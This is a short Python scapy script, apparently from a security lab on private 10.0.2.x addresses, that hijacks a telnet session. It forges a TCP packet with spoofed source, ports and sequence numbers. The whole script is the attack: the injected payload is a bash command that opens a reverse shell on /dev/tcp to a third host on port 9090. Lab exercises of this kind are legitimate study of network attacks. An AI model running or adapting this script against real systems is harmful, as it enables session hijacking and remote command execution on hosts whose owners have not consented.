#!/usr/bin/python

from scapy.all import *

ip = IP(src="10.0.2.128", dst="10.0.2.129")
tcp = TCP(sport=48150, dport=23, flags="A", seq=2576363239, ack=3494563727)
data = "/bin/bash -i > /dev/tcp/10.0.2.130/9090 2>&1 0<&1\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
